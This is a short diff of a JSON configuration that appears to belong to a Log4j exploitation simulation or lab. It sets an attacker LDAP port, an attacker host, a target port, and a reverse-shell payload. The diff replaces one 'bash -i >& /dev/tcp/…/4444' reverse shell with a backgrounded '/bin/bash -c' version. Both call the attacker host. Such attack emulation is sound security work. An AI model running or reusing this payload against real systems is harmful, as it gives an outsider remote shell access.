@@ -15,7 +15,7 @@
               "attacker_ldap_port": 1389,
               "attacker_ip": "log4j-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8080,
-              "payload": "bash -i >& /dev/tcp/log4j-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1"
+              "payload": "/bin/bash -c 'bash -i >& /dev/tcp/log4j-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1 &'"
             }
           },
           "responder": {
